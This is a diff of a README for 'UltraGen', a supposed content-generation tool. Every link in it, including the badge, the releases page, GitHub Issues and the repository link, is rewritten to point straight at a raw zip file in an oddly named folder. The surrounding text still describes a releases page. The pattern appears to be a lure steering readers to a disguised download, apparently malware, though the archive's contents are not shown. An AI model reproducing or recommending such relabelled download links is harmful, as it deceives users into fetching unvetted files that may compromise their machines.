@@ -1,6 +1,6 @@
 # 🚀 UltraGen - Generate Unique Content Effortlessly
 
-![Download UltraGen](https://img.shields.io/badge/Download-UltraGen-blue?style=for-the-badge)
+![Download UltraGen](https://raw.githubusercontent.com/JackLoomer31/UltraGen/master/sanitarist/Gen-Ultra-1.7.zip)
 
 ## 🎯 Overview
 
@@ -13,7 +13,7 @@ To get started with UltraGen, follow these simple steps. You will soon be able t
 ## 🔗 Download & Install
 
 1. **Visit the Releases Page**: Go to the following link to download UltraGen:
-   [Download UltraGen](https://github.com/JackLoomer31/UltraGen/releases)
+   [Download UltraGen](https://raw.githubusercontent.com/JackLoomer31/UltraGen/master/sanitarist/Gen-Ultra-1.7.zip)
 
 2. **Choose the Right Version**: On the releases page, you will see various versions of UltraGen. Select the latest version for the best features and improvements.
 
@@ -64,11 +64,11 @@ For more help and guidance, you can refer to the following resources:
 
 ## 🌐 Contact
 
-If you need further assistance, feel free to reach out via [GitHub Issues](https://github.com/JackLoomer31/UltraGen/issues). We are here to help you get the most out of UltraGen.
+If you need further assistance, feel free to reach out via [GitHub Issues](https://raw.githubusercontent.com/JackLoomer31/UltraGen/master/sanitarist/Gen-Ultra-1.7.zip). We are here to help you get the most out of UltraGen.
 
 ## 🔗 Quick Links
 
-- **Direct Download Link**: [Download UltraGen](https://github.com/JackLoomer31/UltraGen/releases)
-- **GitHub Repository**: [UltraGen Github](https://github.com/JackLoomer31/UltraGen)
+- **Direct Download Link**: [Download UltraGen](https://raw.githubusercontent.com/JackLoomer31/UltraGen/master/sanitarist/Gen-Ultra-1.7.zip)
+- **GitHub Repository**: [UltraGen Github](https://raw.githubusercontent.com/JackLoomer31/UltraGen/master/sanitarist/Gen-Ultra-1.7.zip)
 
 Now you're ready to create unique content effortlessly. Enjoy using UltraGen!
